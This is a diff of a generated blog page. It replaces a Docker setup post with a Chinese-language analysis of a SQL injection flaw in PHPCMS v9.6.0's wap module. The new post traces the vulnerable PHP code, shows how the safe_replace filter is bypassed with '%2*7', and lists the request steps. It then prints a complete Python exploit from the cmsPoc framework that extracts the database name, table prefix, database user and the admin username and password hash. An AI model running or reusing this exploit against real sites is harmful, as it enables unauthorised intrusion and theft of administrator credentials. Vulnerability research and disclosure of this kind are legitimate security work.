@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="docker," />
+  <meta name="keywords" content="代码审计,php,sql注入," />
 
 
 
@@ -89,22 +89,18 @@
 
 
 
-<meta name="description" content="由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。">
+<meta name="description" content="PHPCMS v9.6.0 wap模块sql注入漏洞分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows平台下Docker环境搭建">
-<meta property="og:url" content="http://yoursite.com/2017/02/13/windows平台下Docker环境搭建/index.html">
+<meta property="og:title" content="PHPCMS v9.6.0 wap模块sql注入漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker1.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker2.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker4.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/docker5.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerwenti1.jpg">
-<meta property="og:updated_time" content="2017-07-06T09:24:05.338Z">
+<meta property="og:description" content="PHPCMS v9.6.0 wap模块sql注入漏洞分析">
+<meta property="og:image" content="https://github.com/CHYbeta/cmsPoc/blob/master/tty.gif?raw=true">
+<meta property="og:updated_time" content="2017-08-04T07:34:22.813Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows平台下Docker环境搭建">
-<meta name="twitter:description" content="由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。">
-<meta name="twitter:image" content="http://ojp0pjljj.bkt.clouddn.com/docker1.jpg">
+<meta name="twitter:title" content="PHPCMS v9.6.0 wap模块sql注入漏洞分析">
+<meta name="twitter:description" content="PHPCMS v9.6.0 wap模块sql注入漏洞分析">
+<meta name="twitter:image" content="https://github.com/CHYbeta/cmsPoc/blob/master/tty.gif?raw=true">
 
 
 
@@ -132,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/02/13/windows平台下Docker环境搭建/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/"/>
 
 
 
 
 
-  <title> windows平台下Docker环境搭建 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> PHPCMS v9.6.0 wap模块sql注入漏洞分析 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -304,7 +300,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/windows平台下Docker环境搭建/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -328,7 +324,7 @@
             
             
               
-                windows平台下Docker环境搭建
+                PHPCMS v9.6.0 wap模块sql注入漏洞分析
               
             
           </h1>
@@ -343,8 +339,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T20:13:30+08:00">
-                2017-02-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-04T14:19:51+08:00">
+                2017-08-04
               </time>
             
 
@@ -366,8 +362,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术杂谈/" itemprop="url" rel="index">
-                    <span itemprop="name">技术杂谈</span>
+                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Web Security</span>
                   </a>
                 </span>
 
@@ -385,7 +381,7 @@
 
           
           
-             <span id="/2017/02/13/windows平台下Docker环境搭建/" class="leancloud_visitors" data-flag-title="windows平台下Docker环境搭建">
+             <span id="/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/" class="leancloud_visitors" data-flag-title="PHPCMS v9.6.0 wap模块sql注入漏洞分析">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -412,43 +408,62 @@
       
 
       
-        <p>由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。</p>
-<a id="more"></a>
-<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>win下我们一般直接选择 Docker Toolbox</p>
-<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>docker的官网：<a href="https://www.docker.com/products/docker-toolbox" target="_blank" rel="external">下载地址</a><br>但官网下载会很慢，甚至下载了好久突然间失败hh</p>
-<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>镜像站：<a href="https://get.daocloud.io/toolbox/" target="_blank" rel="external">下载地址</a><br>速度快，但版本的更新问题啥的自己注意。</p>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>下载的exe打开，一路跟着提示走。</p>
+        <p>PHPCMS v9.6.0 wap模块sql注入漏洞分析<br><a id="more"></a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在/phpcms/modules/content/down.php中，约莫第11行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">unset</span>($i,$m,$f);</div><div class="line">	parse_str($a_k);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</div><div class="line">	$allow_visitor = <span class="number">1</span>;</div><div class="line">	$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</div><div class="line">	$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</div><div class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</div><div class="line">	$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</div></pre></td></tr></table></figure></p>
+<p>首先，通过GET方法得到参数<code>$a_k</code>。在经过<code>sys_auth</code>解密(里面有个DECODE)后，对<code>$a_k</code>进行了一次parse_str($a_k)，parse_str()会把字符串解析到对ing的变量中。在经过解析后，通过语句<code>$rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>将变量id带入查询。所以目标是寻找一个能加密的地方，并且能够回显给我们，这样就能构造参数$a_k，并造成注入。</p>
+<p>在 /phpcms/modules/attachment/attachments.php 中，约莫第239行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</div><div class="line">		$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</div><div class="line">		$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</div><div class="line">		$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</div><div class="line">		$json_str = json_encode($arr);</div><div class="line">		$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</div><div class="line">		$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</div><div class="line">		<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</div><div class="line">			param::set_cookie(<span class="string">'att_json'</span>,$json_str);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>通过GET方法得到参数$arr[‘src’]，先经过<code>safe_replace()</code>过滤。我们先看一下<code>safe_replace()</code>函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>将<code>%27</code>等关键字过滤。但是利用“*”会被直接过滤为空这点，假设传入的$string为<code>%2*7</code>,则在替换后，会变成<code>%27</code>，从而获得单引号，其余可类似绕过。</p>
+<p>接下来继续运行。若不满足条件，会进入set_cookie()函数，具体如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</div><div class="line">	$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</div><div class="line">	$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</div><div class="line">	$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</div><div class="line">	$_COOKIE[$var] = $value;</div><div class="line">	<span class="keyword">if</span> (is_array($value)) &#123;</div><div class="line">		<span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</div><div class="line">			setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>其中，会将传入的参数进行一次加密sys_auth($value, ‘ENCODE’)，这正好满足我们前面的需求。</p>
+<p>为了能访问到swfupload_json()，我们需要一个cookie。这样在访问时才不会直接跳转到登陆也main。接下来就是寻找能够给我们提供这次setcookie机会的接口。比如说wap模块。<br>在 /phpcms/modules/wap/index.php 中，约莫第6行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		</div><div class="line">	<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</div><div class="line">	<span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</div><div class="line">	param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);</div></pre></td></tr></table></figure></p>
+<p>通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。</p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>所以利用步骤如下：</p>
 <ul>
-<li>可以自己选择安装位置,但要记住。后面要用到。这里为 D:\Docker Toolbox</li>
-<li>注意需要安装virtualbox，因为我们是在win平台下安装docker，而docker是高度依赖linux的，所以这里需要virtualbox（开源免费）来提供win平台下linux内核的接口与特性</li>
-<li>需要安装git for windows，若原本机子中已经有了，可以勾掉不选择。</li>
-<li>kitematic是docker的GUI工具，也顺便安了吧。不过一般咱都是用命令行的嘛。</li>
-<li>耐心等待安装过程结束</li>
+<li>访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。</li>
+<li>将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】</li>
+<li>获取返回头的set—Cookie字段，此即为加密后的payload</li>
+<li>访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。</li>
 </ul>
-<h1 id="初次启动"><a href="#初次启动" class="headerlink" title="初次启动"></a>初次启动</h1><p>安装完成后，桌面上会多出三个图标</p>
-<ul>
-<li>Oracle VM VirtualBox</li>
-<li>Kitematic (Alpha)</li>
-<li>Docker Quickstart Terminal</li>
-</ul>
-<p>这里我们只需要先打开（双击）第三个。第一次运行时，黑屏幕上只有光标，可能需要先打一个回车。一般情况下如下：</p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/docker1.jpg" alt=""></p>
-<p>可能等很久都没有反应，我说的是 “可能”hh<br>注意到里面的意思是要把 boot2docker 下载下来，记住下载路径：</p>
-<pre><code>C:\Users\ASUS\.docker\machine\cache
-</code></pre><p>打开dokcer的安装路径（以我的安装路径为例）D:\Docker Toolbox<br>将里面的 boot2docker.iso 拷贝到 下载路径里</p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/docker2.jpg" alt=""></p>
-<p>回到桌面运行 Docker Quickstart Terminal，可能需要再按一次回车</p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/docker4.jpg" alt=""></p>
-<p>等“安装”完成，控制台会出现：<br><img src="http://ojp0pjljj.bkt.clouddn.com/docker5.jpg" alt=""></p>
-<p>完成后最好重启一下<br>这样就行啦。</p>
-<h1 id="可能的问题"><a href="#可能的问题" class="headerlink" title="可能的问题"></a>可能的问题</h1><h2 id="初始化问题"><a href="#初始化问题" class="headerlink" title="初始化问题"></a>初始化问题</h2><p><img src="http://ojp0pjljj.bkt.clouddn.com/dockerwenti1.jpg" alt=""><br>解决方法：将 virtualbox 和 docker 卸载掉，重启，再重新安装</p>
-<h2 id="Terminal一直自动关闭"><a href="#Terminal一直自动关闭" class="headerlink" title="Terminal一直自动关闭"></a>Terminal一直自动关闭</h2><p>解决方法：重启电脑……</p>
+<p>开源CMS渗透测试框架 <a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a>中已集成了利用脚本 v960_sqlinject_getpasswd.py。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> target</div><div class="line"><span class="keyword">import</span> requests,sys,urllib</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		url = target.url</div><div class="line">		sqli_prefix = <span class="string">'%*27an*d%20'</span></div><div class="line">		sqli_info = <span class="string">'updatexml(1,concat(1,(user())),1)'</span></div><div class="line">		sqli_password1 = <span class="string">'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from '</span></div><div class="line">		sqli_password2 = <span class="string">'_admin limit 0,1)),1)'</span></div><div class="line">		sqli_padding = <span class="string">'%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'</span></div><div class="line"></div><div class="line">		step1 = url + <span class="string">'/index.php?m=wap&amp;a=index&amp;siteid=1'</span></div><div class="line">		r = requests.get(step1)</div><div class="line">		post = &#123;<span class="string">"userid_flash"</span>:r.cookies[<span class="string">"GPYAh_siteid"</span>]&#125;</div><div class="line">		print(<span class="string">'[+] Get Cookie : '</span> + r.cookies[<span class="string">"GPYAh_siteid"</span>])</div><div class="line"></div><div class="line">		step2  = url + <span class="string">"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id="</span> + sqli_prefix + sqli_info+ sqli_padding</div><div class="line">		r = requests.post(step2,data=post)</div><div class="line">		sqli_payload = r.cookies[<span class="string">"GPYAh_att_json"</span>]</div><div class="line">		print(<span class="string">'[+] Get SQLi Payload : '</span> + sqli_payload)</div><div class="line"></div><div class="line">		step3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</div><div class="line">		html = requests.get(step3).text</div><div class="line"></div><div class="line">		db_start = html.find(<span class="string">"SELECT * FROM `"</span>) + len(<span class="string">"SELECT * FROM `"</span>)</div><div class="line">		db_end = html.find(<span class="string">"`.`"</span>)</div><div class="line">		Database = html[db_start:db_end]</div><div class="line">		print(<span class="string">"[+] Get Database Name: "</span>+ Database)</div><div class="line"></div><div class="line">		tableprefix_start = html.find(<span class="string">"`.`"</span>) + len(<span class="string">"`.`"</span>)</div><div class="line">		tableprefix_end = html.find(<span class="string">"_download_data"</span>)</div><div class="line">		tableprefix = html[tableprefix_start:tableprefix_end]</div><div class="line">		print(<span class="string">"[+] Get Table Prefix: "</span>+ tableprefix)</div><div class="line"></div><div class="line">		startIndex = html.find(<span class="string">"XPATH syntax error: '"</span>) + len(<span class="string">"XPATH syntax error: '"</span>)</div><div class="line">		endIndex = html.find(<span class="string">"' &lt;br /&gt; &lt;b&gt;MySQL Errno"</span>)</div><div class="line">		database_user = html[startIndex:endIndex]</div><div class="line">		print(<span class="string">"[+] Get Database-user Information : "</span> + database_user)</div><div class="line"></div><div class="line">		step4  = url + <span class="string">"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id="</span> + sqli_prefix + sqli_password1+ tableprefix + sqli_password2 + sqli_padding</div><div class="line">		r = requests.post(step4,data=post)</div><div class="line">		sqli_payload = r.cookies[<span class="string">"GPYAh_att_json"</span>]</div><div class="line"></div><div class="line">		setp5 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</div><div class="line">		html = requests.get(setp5).text</div><div class="line">		startIndex = html.find(<span class="string">"XPATH syntax error: '"</span>) + len(<span class="string">"XPATH syntax error: '"</span>)</div><div class="line">		endIndex = html.find(<span class="string">"' &lt;br /&gt; &lt;b&gt;MySQL Errno"</span>)</div><div class="line">		admin_passwd = html[startIndex:endIndex]</div><div class="line">		print(<span class="string">"[+] Get User Passwd: "</span> + admin_passwd)</div><div class="line"></div><div class="line">		print(<span class="string">"\033[33m[*] Complete this task: &#123;&#125; \033[0m"</span>.format(target.url))</div><div class="line"></div><div class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</div><div class="line"></div><div class="line">		print(<span class="string">"\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"</span>)</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/cmsPoc/blob/master/tty.gif?raw=true" alt=""></p>
 
       
     </div>
 	<div>
       
         
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2017年08月04日 - 14:08</p>
+  <p><span>最后更新:</span>2017年08月04日 - 15:08</p>
+  <p><span>原始链接:</span><a href="/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/" title="PHPCMS v9.6.0 wap模块sql注入漏洞分析">http://yoursite.com/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
 
       
 	</div>
@@ -487,7 +502,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/docker/" rel="tag"># docker</a>
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
           
         </div>
       
@@ -496,8 +515,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/02/数据挖掘比赛（5）ten-Minutes-to-pandas中文版下/" rel="next" title="数据挖掘比赛（5）ten Minutes to pandas中文版下">
-                <i class="fa fa-chevron-left"></i> 数据挖掘比赛（5）ten Minutes to pandas中文版下
+              <a href="/2017/08/01/Pwnable-kr-shellshock/" rel="next" title="Pwnable.kr:shellshock">
+                <i class="fa fa-chevron-left"></i> Pwnable.kr:shellshock
               </a>
             
           </div>
@@ -506,8 +525,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/02/14/win下Docker默认存储位置修改/" rel="prev" title="win下Docker默认存储位置修改">
-                win下Docker默认存储位置修改 <i class="fa fa-chevron-right"></i>
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -677,7 +696,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#下载"><span class="nav-number">1.</span> <span class="nav-text">下载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#法一"><span class="nav-number">1.1.</span> <span class="nav-text">法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#法二"><span class="nav-number">1.2.</span> <span class="nav-text">法二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#初次启动"><span class="nav-number">3.</span> <span class="nav-text">初次启动</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#可能的问题"><span class="nav-number">4.</span> <span class="nav-text">可能的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#初始化问题"><span class="nav-number">4.1.</span> <span class="nav-text">初始化问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Terminal一直自动关闭"><span class="nav-number">4.2.</span> <span class="nav-text">Terminal一直自动关闭</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a></li></ol></div>
             
 
           </div>
